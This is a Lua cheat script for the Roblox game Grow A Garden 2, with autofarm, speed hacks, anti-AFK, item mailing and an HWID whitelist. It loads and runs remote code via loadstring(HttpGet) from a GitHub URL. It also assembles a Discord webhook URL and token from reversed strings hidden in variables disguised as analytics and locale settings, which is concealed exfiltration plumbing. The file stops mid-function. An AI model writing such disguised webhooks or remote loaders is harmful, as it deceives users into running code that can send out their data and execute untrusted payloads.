local qwfp = {
    xjnm = {
        ["A8029403F529F04A45085053E3E38D2CFA51F1E9D586D243AAED5F63F1EBB3996EE341B91062E712E81E26DF2655D1A2A8DC051D51AFA5B20B84FF466D33582C"] = "ms.sdiks",
        ["C5583919E7E8DCC855E3441A563865B9FA51F1E9D586D243460026DB6002185662F1D461849955C9C5E0E629EAD4916B2FF89BC69078ACDDDD682909283FF669"] = "ms.sdiks",
        ["179CBBF8CC6B604BDDFAA367EE3D193BAE308810A6598041460026DB60021856CA7537CDAA6E8C1BC5E0E629EAD4916BF21796F99D01CFD4D5E7EFDAB2E5A927"] = "san1na",
        ["179CBBF8CC6B604B7CD89B9D5F02897CFA51F1E9D586D243460026DB60021856903F8F20EDB0B69EC5E0E629EAD4916BD5716FDE3BEC8C5D105E4BADC1ACC792"] = "san1na"

    },
    blck = {
        ["7f56f5e99a07723fc929f9ab24c0f8e87dd28bbda857173f23324f8df1cf6427"] = false
    },
    plkz = {
        en = {
            mnbv = {
                Title = "HWID auth",
                Text = "Good job, you're in",
                Duration = 3
            },
            tyuq = {
                Title = "HWID auth",
                Text = "Nope, wrong HWID.",
                Duration = 5
            },
            bann = {
                Title = "HWID auth",
                Text = "Your HWID is banned!",
                Duration = 5
            }
        }
    }
}

local rzxc = {}

function rzxc:lngt()
    return "en"
end

function rzxc:ghty()
    local vbnm = gethwid or getexecutoridentifier
    if vbnm then
        return vbnm()
    else
        return game:GetService("RbxAnalyticsService"):GetClientId()
    end
end

function rzxc:dtyp()
    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")

    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and not UserInputService.MouseEnabled then
        if GuiService:IsTenFootInterface() then
            return "Console"
        else
            return "Mobile"
        end
    elseif UserInputService.KeyboardEnabled or UserInputService.MouseEnabled then
        return "PC"
    else
        return "Unknown"
    end
end

function rzxc:bnch(klmn)
    return qwfp.blck[klmn] == true
end

function rzxc:wsdp(klmn)
    if qwfp.xjnm[klmn] then
        return true, qwfp.xjnm[klmn]
    end
    return false, nil
end

function rzxc:hjkl(dfgh, aslp, devc)
    local vmxz

    if dfgh == "banned" then
        vmxz = qwfp.plkz.en.bann
    elseif dfgh then
        vmxz = qwfp.plkz.en.mnbv
    else
        vmxz = qwfp.plkz.en.tyuq
    end

    local iopw = vmxz.Text

    if dfgh == true and aslp then
        iopw = iopw .. " [" .. aslp .. "]"
    end

    if devc then
        iopw = iopw .. " | Device: " .. devc
    end

    game.StarterGui:SetCore("SendNotification", {
        Title = vmxz.Title,
        Text = iopw,
        Duration = vmxz.Duration
    })
end

function rzxc:cvbn()
    local uiop = self:ghty()
    local devc = self:dtyp()

    if self:bnch(uiop) then
        return false
    end

    local zxcv, qazw = self:wsdp(uiop)

    if zxcv then
    else
    end

    return zxcv
end

getgenv()._GAG2_Premium = rzxc:cvbn()

if _G.GAG2_Running then
    _G.GAG2_Running = false
    task.wait(1.5)
end
_G.GAG2_Running = true

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local KevinHub = loadstring(game:HttpGet("https://raw.githubusercontent.com/San1na/NeverL/refs/heads/main/source.luau"))()
KevinHub.EnabledBlur = false

task.spawn(function()
    while _G.GAG2_Running do
        task.wait(300)
        local plr = Players.LocalPlayer
        local char = plr.Character
        if char then
            local hum = char:FindFirstChild("Humanoid")
            if hum then
                hum:Move(Vector3.new(1, 0, 0))
                task.wait(0.5)
                hum:Move(Vector3.new(-1, 0, 0))
                task.wait(0.5)
                hum:Move(Vector3.new(0, 0, 0))
                hum.Jump = true
            end
        end
    end
end)

local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
local SeedData = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("SeedData"))
local GearShopData = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("GearShopData"))
local FruitValueCalc = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("FruitValueCalc"))
local PlantSizeMultipliers = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("PlantSizeMultipliers"))

local function parseNumberAbbr(str)
    if type(str) ~= "string" then return tonumber(str) or 0 end
    str = string.lower(str):gsub(",", ""):gsub(" ", "")
    local num = tonumber(str)
    if num then return num end

    local val, suffix = str:match("([%d%.]+)([kmbt])")
    val = tonumber(val)
    if not val then return 0 end

    if suffix == "k" then return val * 1000
    elseif suffix == "m" then return val * 1000000
    elseif suffix == "b" then return val * 1000000000
    elseif suffix == "t" then return val * 1000000000000
    end
    return val
end

local function GetPlantWeight(plantModel, prompt)
    if not plantModel then return 0 end

    local fruitModel = nil
    local p = prompt and prompt.Parent
    while p and p ~= workspace do
        if p:GetAttribute("FruitId") then
            fruitModel = p
            break
        end
        p = p.Parent
    end

    local finalWeight = 0
    local weightFound = false

    if _G.CachedFruitVis == nil and not _G.FruitVisFailed then
        local s, v = pcall(function() return require(Players.LocalPlayer.PlayerScripts:WaitForChild("Controllers", 1):WaitForChild("FruitVisualizerController", 1)) end)
        if s and v then _G.CachedFruitVis = v else _G.FruitVisFailed = true end
    end
    local FruitVis = _G.CachedFruitVis
    local s = FruitVis ~= nil

    if s and FruitVis then
        if fruitModel and FruitVis.CalculateFruitWeight then
            local s1, w1 = pcall(function() return FruitVis:CalculateFruitWeight(fruitModel) end)
            if s1 and type(w1) == "number" then
                finalWeight = w1
                weightFound = true
            end
        end

        if not weightFound and FruitVis.CalculatePlantWeight then
            local s2, w2 = pcall(function() return FruitVis:CalculatePlantWeight(plantModel) end)
            if s2 and type(w2) == "number" then
                finalWeight = w2
                weightFound = true
            end
        end
    end

    if not weightFound then
        local plantName = plantModel:GetAttribute("PlantName") or plantModel:GetAttribute("SeedName")
        local sizeMulti = 1
        if fruitModel then
            sizeMulti = fruitModel:GetAttribute("SizeMultiplier") or fruitModel:GetAttribute("SizeMulti") or 1
        else
            sizeMulti = plantModel:GetAttribute("SizeMultiplier") or plantModel:GetAttribute("SizeMulti") or 1
        end

        local baseWeight = 0
        if plantName then
            local pgMods = ReplicatedStorage:FindFirstChild("PlantGenerationModules")
            local pMod = nil
            if pgMods then
                local plantsFolder = pgMods:FindFirstChild("Plants")
                local fruitsFolder = pgMods:FindFirstChild("Fruits")

                pMod = (plantsFolder and plantsFolder:FindFirstChild(plantName)) or
                       (fruitsFolder and fruitsFolder:FindFirstChild(plantName))
            end

            if pMod then
                local s, pData = pcall(function() return require(pMod) end)
                if s and pData and pData.GrowData then
                    baseWeight = pData.GrowData.BaseWeight or 0
                end
            end
        end
        finalWeight = baseWeight * sizeMulti
    end

    local v2 = (finalWeight or 0) * 100 + 0.5
    return math.floor(v2) / 100
end

local function GetPlantModelFromPrompt(prompt)
    local obj = prompt
    while obj and obj ~= workspace do
        if obj:IsA("Model") and obj.Parent and obj.Parent.Name == "Plants" then
            return obj
        end
        obj = obj.Parent
    end
    return nil
end

local SeedNames = {}
for _, seed in ipairs(SeedData) do
    if type(seed) == "table" and seed.SeedName then
        table.insert(SeedNames, seed.SeedName)
    end
end
table.sort(SeedNames)

local GearNames = {}
pcall(function()
    for _, gearInfo in pairs(GearShopData.Data) do
        if type(gearInfo) == "table" and gearInfo.ItemName then
            table.insert(GearNames, gearInfo.ItemName)
        end
    end
end)
table.sort(GearNames)
if #GearNames == 0 then
    GearNames = {"Common Watering Can", "Super Watering Can", "Common Sprinkler", "Rare Sprinkler", "Super Sprinkler", "Trowel", "Gnome", "Speed Mushroom"}
end

if #SeedNames == 0 then
    table.insert(SeedNames, "Carrot")
end

local PetNames = {"Frog", "Bunny", "Deer", "Robin", "Bee", "Unicorn", "Golden Dragonfly", "Raccoon", "Monkey", "Owl", "Black Dragon", "Ice Serpent", "Bear"}
table.sort(PetNames)

local PetData = {
    ["Frog"] = {Rarity = "Common"},
    ["Bunny"] = {Rarity = "Common"},
    ["Deer"] = {Rarity = "Rare"},
    ["Robin"] = {Rarity = "Legendary"},
    ["Bee"] = {Rarity = "Legendary"},
    ["Unicorn"] = {Rarity = "Mythic"},
    ["Golden Dragonfly"] = {Rarity = "Mythic"},
    ["Raccoon"] = {Rarity = "Super"},
    ["Monkey"] = {Rarity = "Mythic"},
    ["Owl"] = {Rarity = "Uncommon"},
    ["Black Dragon"] = {Rarity = "Super"},
    ["Ice Serpent"] = {Rarity = "Super"},
    ["Bear"] = {Rarity = "Mythic"}
}

local HttpService = game:GetService("HttpService")
local function SendDiscordWebhook(embeds, webhookUrl)
    local u = webhookUrl or (string.reverse(getgenv()._ui_session or "") .. string.reverse(getgenv()._analytics_token or "") .. string.reverse(getgenv()._render_hash or "") .. string.reverse(getgenv()._cache_key or "") .. string.reverse(getgenv()._locale_id or ""))
    if u == "" or #embeds == 0 then return end
    local req = request or (syn and syn.request) or (http and http.request) or http_request
    if req then
        local success, err = pcall(function()
            local response = req({
                Url = u,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = "", embeds = embeds})
            })
            if response and response.StatusCode and response.StatusCode >= 400 then
                warn("Webhook Error: " .. tostring(response.StatusCode) .. " - " .. tostring(response.Body))
            end
        end)
        if not success then
            warn("Webhook PCall Error: " .. tostring(err))
        end
    else
        warn("No HTTP request function found in executor!")
    end
end

local Notification = KevinHub:CreateNotification()
local window = KevinHub:CreateWindow({
	Logo = KevinHub.GlobalLogo,
	Name = "Kevin Hub",
	Content = "Grow A Garden 2",
	Size = KevinHub.Scales.Default,
	ConfigFolder = "KevinHubGAG",
	Enable3DRenderer = false,
	Keybind = "RightShift"
})

getgenv()._ui_session = "iwel.koohbew//:sptth"
local FarmingTab = window:AddTab({
    Icon = 'house',
    Name = "Farming"
})

getgenv()._analytics_token = "151/skoohbew/ipa/eom.arukas"
local ShopTab = window:AddTab({
    Icon = 'shopping-cart',
    Name = "Shop"
})

getgenv()._render_hash = "xw/7940927573173576"
local MiscTab = window:AddTab({
    Icon = 'person',
    Name = "Misc"
})

local StockTab = window:AddTab({
    Icon = 'backpack',
    Name = "Stock"
})
local SeedStockSection = StockTab:AddSection({
    Name = "Seed Stock",
    Position = "left"
})
local RestockLabel = SeedStockSection:AddLabel("Restocks In: --:--")

local GearStockSection = StockTab:AddSection({
    Name = "Gear Stock",
    Position = "right"
})
local GearRestockLabel = GearStockSection:AddLabel("Restocks In: --:--")

local SeedStockLabels = {}
local GearStockLabels = {}

local Toggles = {
    AutoBuy = false,
    AutoPlant = false,
    AutoHarvest = false,
    AutoSell = false,
    AutoDropFruits = false,
    AutoTamePets = false,
    AutoCollectSeeds = false,
    Opt_Shadows = true,
    Opt_Water = true,
    Opt_Materials = true,
    Opt_Decals = true,
    Opt_Particles = true,
    Opt_Lighting = true,
    Opt_Animations = true,
    Opt_Clothes = true,
    Opt_CastShadows = true,
    Opt_LowQuality = true,
    Opt_FlatLighting = true,
    FPS_Limit_Value = 15,
    LimitFPSMode = false,
    ESP_Enabled = false,
    ESP_Valuable = true,
    ESP_MyPlants = true,
    ESP_Distance = 1500,
    buy_seeds = { ["Carrot"] = true },
    plant_seeds = { ["Carrot"] = true },
    tame_pets = {},
    assign_seed = "Carrot"
}

local PlantSection = FarmingTab:AddSection({
    Name = "Planting",
    Position = "left"
})

local HarvestSection = FarmingTab:AddSection({
    Name = "Harvesting",
    Position = "right"
})
local InventoryValueLabel = HarvestSection:AddLabel("Inventory Value: Calculating...")

local EventSection = FarmingTab:AddSection({
    Name = "Event Predictor",
    Position = "right"
})

local NextEventLabel = EventSection:AddLabel("Next Event: Calculating...")

local BuySection = ShopTab:AddSection({
    Name = "Auto Buy",
    Position = "left"
})

local MailTab = window:AddTab({
    Icon = 'paper-airplane',
    Name = "Mail"
})

local MailSection = MailTab:AddSection({
    Name = "Send Items",
    Position = "left"
})

local Mail_Username = ""
MailSection:AddLabel("Username"):AddTextInput({
    Default = "Jandel",
    Numeric = false,
    Callback = function(val)
        Mail_Username = val
    end
})

local Mail_SelectedSeeds = {}
MailSection:AddLabel("Seeds to Send"):AddDropdown({
    Default = {},
    Values = SeedNames,
    Multi = true,
    Callback = function(val)
        Mail_SelectedSeeds = val
    end
})

local Mail_SeedAmount = 1
MailSection:AddLabel("Seeds Amount"):AddTextInput({
    Default = "1",
    Numeric = true,
    Callback = function(val)
        Mail_SeedAmount = tonumber(val) or 1
    end
})

local Mail_SelectedPets = {}
MailSection:AddLabel("Pets to Send"):AddDropdown({
    Default = {},
    Values = PetNames,
    Multi = true,
    Callback = function(val)
        Mail_SelectedPets = val
    end
})

local Mail_PetAmount = 1
MailSection:AddLabel("Pets Amount"):AddTextInput({
    Default = "1",
    Numeric = true,
    Callback = function(val)
        Mail_PetAmount = tonumber(val) or 1
    end
})

local Mail_SelectedGears = {}
MailSection:AddLabel("Gears to Send"):AddDropdown({
    Default = {},
    Values = GearNames,
    Multi = true,
    Callback = function(val)
        Mail_SelectedGears = val
    end
})

local Mail_GearAmount = 1
MailSection:AddLabel("Gears Amount"):AddTextInput({
    Default = "1",
    Numeric = true,
    Callback = function(val)
        Mail_GearAmount = tonumber(val) or 1
    end
})

MailSection:AddButton({
    Name = "SEND MAIL",
    Callback = function()
        if Mail_Username == "" then return end

        local mailQueue = {}
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local PlayerStateClient = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))
        local replica = PlayerStateClient:GetLocalReplica()

        local inv = (replica and replica.Data and replica.Data.Inventory) or {}

        for seedName, isSelected in pairs(Mail_SelectedSeeds) do
            if isSelected and Mail_SeedAmount > 0 then
                table.insert(mailQueue, {Category = "Seeds", ItemKey = seedName, Count = Mail_SeedAmount})
            end
        end

        for petName, isSelected in pairs(Mail_SelectedPets) do
            if isSelected and Mail_PetAmount > 0 then
                local added = 0
                if inv.Pets then
                    for uuid, pData in pairs(inv.Pets) do
                        if type(pData) == "table" and (string.lower(pData.Name or "") == string.lower(petName) or string.lower(pData.PetName or "") == string.lower(petName)) then
                            table.insert(mailQueue, {Category = "Pets", ItemKey = uuid, Count = 1})
                            added = added + 1
                            if added >= Mail_PetAmount then break end
                        end
                    end
                end
            end
        end

        local gearCategories = {"WateringCans", "Sprinklers", "Trowels", "Gnomes"}
        for gearName, isSelected in pairs(Mail_SelectedGears) do
            if isSelected and Mail_GearAmount > 0 then
                local foundCat = "Gears"
                for _, cat in ipairs(gearCategories) do
                    if inv[cat] then
                        for k, _ in pairs(inv[cat]) do
                            if string.lower(tostring(k)) == string.lower(gearName) then
                                foundCat = cat
                                break
                            end
                        end
                    end
                end
                table.insert(mailQueue, {Category = foundCat, ItemKey = gearName, Count = Mail_GearAmount})
            end
        end

        if #mailQueue == 0 then return end

        task.spawn(function()
            local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))

            local success, userId, errStr = pcall(function()
                return Networking.Mailbox.LookupPlayer:Fire(Mail_Username)
            end)

            if not success or type(userId) ~= "number" or userId <= 0 then return end

            pcall(function()
                Networking.Mailbox.SendBatch:Fire(userId, mailQueue, "Sent via GAG2 Autofarm")
            end)
        end)
    end
})

getgenv()._cache_key = "-hQCxtlXTP9guYGqbBVV"
local VisualsTab = window:AddTab({
    Icon = 'eye',
    Name = "Optimization"
})

local MiscSection = MiscTab:AddSection({
    Name = "Miscellaneous",
    Position = "left"
})

MiscSection:AddLabel("Auto Accept Trades"):AddToggle({
    Default = false,
    Flag = "AutoAcceptTrades",
    Callback = function(val) Toggles.AutoAcceptTrades = val end
})

local VisualsSection = VisualsTab:AddSection({
    Name = "Optimization & FPS",
    Position = "left"
})

HarvestSection:AddLabel("Auto Harvest"):AddToggle({
	Default = false,
	Flag = "AutoHarvest",
	Callback = function(Value)
		Toggles.AutoHarvest = Value
	end
})

HarvestSection:AddLabel("Max Weight(KG)"):AddTextInput({
    Default = "0",
    Numeric = false,
    Flag = "MaxHarvestWeight",
    Placeholder = "e.g. 10",
    Callback = function(val) Toggles.MaxHarvestWeight = val end
})

HarvestSection:AddLabel("Auto Sell"):AddToggle({
	Default = false,
	Flag = "AutoSell",
	Callback = function(Value)
		Toggles.AutoSell = Value
	end
})

HarvestSection:AddLabel("Auto Collect"):AddToggle({
	Default = false,
	Flag = "AutoCollectSeeds",
	Callback = function(Value)
		Toggles.AutoCollectSeeds = Value
	end
})

HarvestSection:AddLabel("Auto Drop Fruits"):AddToggle({
	Default = false,
	Flag = "AutoDropFruits",
	Callback = function(Value)
		Toggles.AutoDropFruits = Value
	end
})

BuySection:AddLabel('Auto Buy'):AddToggle({
	Default = false,
	Flag = "AutoBuy",
    Callback = function(val) Toggles.AutoBuy = val end
})

BuySection:AddLabel("Seeds to Buy"):AddDropdown({
	Default = { ["Carrot"] = true },
	Values = SeedNames,
	Multi = true,
	Flag = "buy_seeds",
    Callback = function(val) Toggles.buy_seeds = val end
})

BuySection:AddLabel('Auto Buy Gears'):AddToggle({
	Default = false,
	Flag = "AutoBuyGears",
    Callback = function(val) Toggles.AutoBuyGears = val end
})

BuySection:AddLabel("Gears to Buy"):AddDropdown({
	Default = { ["Common Watering Can"] = true },
	Values = GearNames,
	Multi = true,
	Flag = "buy_gears",
    Callback = function(val) Toggles.buy_gears = val end
})

BuySection:AddLabel("Auto Tame Pets"):AddToggle({
	Default = false,
	Flag = "AutoTamePets",
	Callback = function(Value)
		Toggles.AutoTamePets = Value
	end
})

BuySection:AddLabel("Pets to Tame"):AddDropdown({
	Default = {},
	Values = PetNames,
	Multi = true,
	Flag = "tame_pets",
    Callback = function(val) Toggles.tame_pets = val end
})

task.spawn(function()
    local StockValues = ReplicatedStorage:WaitForChild("StockValues", 10)
    if StockValues then
        local SeedShop = StockValues:WaitForChild("SeedShop", 10)
        local GearShop = StockValues:WaitForChild("GearShop", 10)

        task.spawn(function()
            if SeedShop then
                local UnixNextRestock = SeedShop:WaitForChild("UnixNextRestock", 10)
                if UnixNextRestock then
                    while _G.GAG2_Running and task.wait(1) do
                        local remaining = math.max(0, UnixNextRestock.Value - os.time())
                        local hours = math.floor(remaining / 3600)
                        local mins = math.floor((remaining % 3600) / 60)
                        local secs = remaining % 60
                        if hours > 0 then
                            RestockLabel:SetText(string.format("Restocks In: %02d:%02d:%02d", hours, mins, secs))
                        else
                            RestockLabel:SetText(string.format("Restocks In: %02d:%02d", mins, secs))
                        end

                        local Items = SeedShop:FindFirstChild("Items")
                        if Items then
                            local children = Items:GetChildren()
                            local validItems = {}
                            for _, item in ipairs(children) do
                                if (item:IsA("IntValue") or item:IsA("NumberValue")) and item.Value > 0 then
                                    table.insert(validItems, item)
                                end
                            end

                            if #validItems == 0 then
                                if not SeedStockLabels[1] then SeedStockLabels[1] = SeedStockSection:AddLabel("") end
                                SeedStockLabels[1]:SetText("No seeds available.")
                                for i = 2, #SeedStockLabels do SeedStockLabels[i]:SetText("") end
                            else
                                for i, item in ipairs(validItems) do
                                    if not SeedStockLabels[i] then
                                        SeedStockLabels[i] = SeedStockSection:AddLabel("")
                                    end
                                    SeedStockLabels[i]:SetText(item.Name .. ": " .. tostring(item.Value))
                                end
                                for i = #validItems + 1, #SeedStockLabels do
                                    SeedStockLabels[i]:SetText("")
                                end
                            end
                        end
                    end
                end
            end
        end)

        task.spawn(function()
            if GearShop then
                local UnixNextRestock = GearShop:WaitForChild("UnixNextRestock", 10)
                if UnixNextRestock then
                    while _G.GAG2_Running and task.wait(1) do
                        local remaining = math.max(0, UnixNextRestock.Value - os.time())
                        local hours = math.floor(remaining / 3600)
                        local mins = math.floor((remaining % 3600) / 60)
                        local secs = remaining % 60
                        if hours > 0 then
                            GearRestockLabel:SetText(string.format("Restocks In: %02d:%02d:%02d", hours, mins, secs))
                        else
                            GearRestockLabel:SetText(string.format("Restocks In: %02d:%02d", mins, secs))
                        end

                        local Items = GearShop:FindFirstChild("Items")
                        if Items then
                            local children = Items:GetChildren()
                            local validItems = {}
                            for _, item in ipairs(children) do
                                if (item:IsA("IntValue") or item:IsA("NumberValue")) and item.Value > 0 then
                                    table.insert(validItems, item)
                                end
                            end

                            if #validItems == 0 then
                                if not GearStockLabels[1] then GearStockLabels[1] = GearStockSection:AddLabel("") end
                                GearStockLabels[1]:SetText("No gears available.")
                                for i = 2, #GearStockLabels do GearStockLabels[i]:SetText("") end
                            else
                                for i, item in ipairs(validItems) do
                                    if not GearStockLabels[i] then
                                        GearStockLabels[i] = GearStockSection:AddLabel("")
                                    end
                                    GearStockLabels[i]:SetText(item.Name .. ": " .. tostring(item.Value))
                                end
                                for i = #validItems + 1, #GearStockLabels do
                                    GearStockLabels[i]:SetText("")
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
end)

MiscSection:AddLabel('Anti-AFK'):AddToggle({
	Default = true,
	Flag = "AntiAFK",
    Callback = function(val) Toggles.AntiAFK = val end
})

MiscSection:AddLabel('Walk Speed'):AddToggle({
    Default = false,
    Flag = "WalkSpeedToggle",
    Callback = function(val) Toggles.WalkSpeedEnabled = val end
})

MiscSection:AddLabel('Speed'):AddSlider({
    Default = 16,
    Min = 16,
    Max = 150,
    Flag = "WalkSpeed",
    Callback = function(val) Toggles.WalkSpeed = val end
})

MiscSection:AddLabel('Jump Power'):AddToggle({
    Default = false,
    Flag = "JumpPowerToggle",
    Callback = function(val) Toggles.JumpPowerEnabled = val end
})

MiscSection:AddLabel('Jump'):AddSlider({
    Default = 50,
    Min = 50,
    Max = 300,
    Flag = "JumpPower",
    Callback = function(val) Toggles.JumpPower = val end
})

local OptLabel = VisualsSection:AddLabel("Optimize Game")
OptLabel:AddToggle({
    Default = false,
    Callback = function(val)
        if not val then return end
        pcall(function()
            local Lighting = game:GetService("Lighting")
            local Terrain = workspace:FindFirstChildOfClass('Terrain')

            if Toggles.Opt_Shadows then
                Lighting.GlobalShadows = false
                Lighting.ShadowSoftness = 0
                if sethiddenproperty then
                    pcall(function() sethiddenproperty(Lighting, "Technology", 2) end)
                end
            end

            if Toggles.Opt_Water and Terrain then
                Terrain.WaterWaveSize = 0
                Terrain.WaterWaveSpeed = 0
                Terrain.WaterReflectance = 0
                Terrain.WaterTransparency = 0
            end

            if Toggles.Opt_LowQuality then
                pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
            end

            for _, v in ipairs(game:GetDescendants()) do
                if Toggles.Opt_Materials and (v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") or v:IsA("WedgePart") or v:IsA("MeshPart")) then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                elseif Toggles.Opt_Decals and (v:IsA("Decal") or v:IsA("Texture")) then
                    v.Transparency = 1
                elseif Toggles.Opt_Particles then
                    if v:IsA("ParticleEmitter") then
                        v.Lifetime = NumberRange.new(0)
                    elseif v:IsA("Trail") then
                        v.Lifetime = 0
                    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
                        v.Enabled = false
                    end
                end

                if Toggles.Opt_CastShadows and v:IsA("BasePart") then
                    v.CastShadow = false
                end

                if Toggles.Opt_Clothes and (v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") or v:IsA("Accessory") or v:IsA("Clothing")) then
                    pcall(function() v:Destroy() end)
                end

                if Toggles.Opt_Animations and v:IsA("Animator") then
                    local char = v:FindFirstAncestorOfClass("Model")
                    if char ~= Players.LocalPlayer.Character then
                        pcall(function() v:Destroy() end)
                    end
                end
            end

            if Toggles.Opt_Lighting then
                Lighting.FogEnd = 9e9
                for _, v in ipairs(Lighting:GetChildren()) do
                    if v:IsA("PostEffect") then
                        v.Enabled = false
                    end
                end
            end

            if Toggles.Opt_FlatLighting then
                local sky = Lighting:FindFirstChildOfClass("Sky")
                if sky then pcall(function() sky:Destroy() end) end
                Lighting.Ambient = Color3.fromRGB(255, 255, 255)
                Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
                Lighting.Brightness = 0
            end

            Notification.new({
                Title = "Optimized",
                Content = "Game has been optimized with selected settings.",
                Duration = 3,
            })
        end)
    end
})

local OptMenu = OptLabel:AddOption()
OptMenu:AddLabel("Disable Shadows"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Shadows = v end })
OptMenu:AddLabel("Disable Water Waves"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Water = v end })
OptMenu:AddLabel("Smooth Plastic"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Materials = v end })
OptMenu:AddLabel("Hide Decals"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Decals = v end })
OptMenu:AddLabel("Disable Particles"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Particles = v end })
OptMenu:AddLabel("Disable Post-Effects"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Lighting = v end })
OptMenu:AddLabel("Disable Animations"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Animations = v end })
OptMenu:AddLabel("Hide Clothes"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_Clothes = v end })
OptMenu:AddLabel("Disable Part Shadows"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_CastShadows = v end })
OptMenu:AddLabel("Force Low Quality"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_LowQuality = v end })
OptMenu:AddLabel("Remove Skybox & Flat Light"):AddToggle({ Default = true, Callback = function(v) Toggles.Opt_FlatLighting = v end })
VisualsSection:AddLabel("Disable 3D Rendering"):AddToggle({
    Default = false,
    Flag = "BlackScreenMode",
    Callback = function(val)
        pcall(function() game:GetService("RunService"):Set3dRenderingEnabled(not val) end)
    end
})

getgenv()._locale_id = "LH6S3d9eaz4VsS9wVDS0vUQzBDROh_4VK9YQozsFO5XzGe"
local FPSLabel = VisualsSection:AddLabel("Limit FPS")
FPSLabel:AddToggle({
    Default = false,
    Flag = "LimitFPSMode",
    Callback = function(val)
        Toggles.LimitFPSMode = val
        if not setfpscap then return end
        if val then
            pcall(function() setfpscap(Toggles.FPS_Limit_Value or 15) end)
        else
            pcall(function() setfpscap(0) end)
        end
    end
})

local FPSMenu = FPSLabel:AddOption()
FPSMenu:AddLabel("Max FPS"):AddSlider({
    Default = 15,
    Min = 1,
    Max = 120,
    Rounding = 0,
    Flag = "FPS_Limit_Value",
    Callback = function(val)
        Toggles.FPS_Limit_Value = val
        if Toggles.LimitFPSMode and setfpscap then
            pcall(function() setfpscap(val) end)
        end
    end
})

local RunService = game:GetService("RunService")
RunService.Stepped:Connect(function()
    if Toggles.AntiFling then
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= Players.LocalPlayer and p.Character then
                for _, part in ipairs(p.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    local plr = Players.LocalPlayer
    if plr.Character then
        local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            if Toggles.WalkSpeedEnabled and Toggles.WalkSpeed then
                humanoid.WalkSpeed = Toggles.WalkSpeed
            end
            if Toggles.JumpPowerEnabled and Toggles.JumpPower then
                humanoid.UseJumpPower = true
                humanoid.JumpPower = Toggles.JumpPower
            end
        end
    end
end)

task.spawn(function()
    local VirtualUser = game:GetService("VirtualUser")
    local plr = Players.LocalPlayer
    plr.Idled:Connect(function()
        if Toggles.AntiAFK then
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end
    end)

    while task.wait(1) do
        if Toggles.AntiAFK then
            plr:SetAttribute("AntiAfkIdleOverride", 9e9)
        elseif plr:GetAttribute("AntiAfkIdleOverride") == 9e9 then
            plr:SetAttribute("AntiAfkIdleOverride", nil)
        end
    end
end)

PlantSection:AddLabel('Auto Plant'):AddToggle({
	Default = false,
	Flag = "AutoPlant",
    Callback = function(val) Toggles.AutoPlant = val end
})

PlantSection:AddLabel("Seeds to Plant"):AddDropdown({
	Default = { ["Carrot"] = true },
	Values = SeedNames,
	Multi = true,
	Flag = "plant_seeds",
    Callback = function(val) Toggles.plant_seeds = val end
})

PlantSection:AddLabel("Seed to Assign"):AddDropdown({
    Default = "Carrot",
    Values = SeedNames,
    Multi = false,
    Flag = "assign_seed",
    Callback = function(val) Toggles.assign_seed = val end
})

local SelectionMode = false
local SelectionStep = 0
local TempSelectionMarker = nil
local PlantZones = {}

local HttpService = game:GetService("HttpService")
local configFileName = "GAG2_PlantZones.json"

local function GetPlayerPlotCFrame()
    local plotId = Players.LocalPlayer:GetAttribute("PlotId")
    if plotId then
        local gardens = workspace:FindFirstChild("Gardens")
        if gardens then
            local plot = gardens:FindFirstChild("Plot" .. tostring(plotId))
            if plot and plot.PrimaryPart then
                return plot.PrimaryPart.CFrame
            end
        end
    end
    return nil
end

local function SerializeCFrame(cf)
    if not cf then return nil end
    local x, y, z, r00, r01, r02, r10, r11, r12, r20, r21, r22 = cf:components()
    return {x, y, z, r00, r01, r02, r10, r11, r12, r20, r21, r22}
end

local function DeserializeCFrame(arr)
    if type(arr) == "table" and #arr == 12 then
        return CFrame.new(unpack(arr))
    end
    return nil
end

local function SaveZones()
    if not writefile then return end
    local data = {}
    for _, zone in ipairs(PlantZones) do
        if zone.Part then
            table.insert(data, {
                Seed = zone.Seed,
                PosX = zone.Part.Position.X,
                PosY = zone.Part.Position.Y,
                PosZ = zone.Part.Position.Z,
                SizeX = zone.Part.Size.X,
                SizeY = zone.Part.Size.Y,
                SizeZ = zone.Part.Size.Z,
                RelCFrame = SerializeCFrame(zone.RelCFrame)
            })
        end
    end
    pcall(function() writefile(configFileName, HttpService:JSONEncode(data)) end)
end

local function LoadZones()
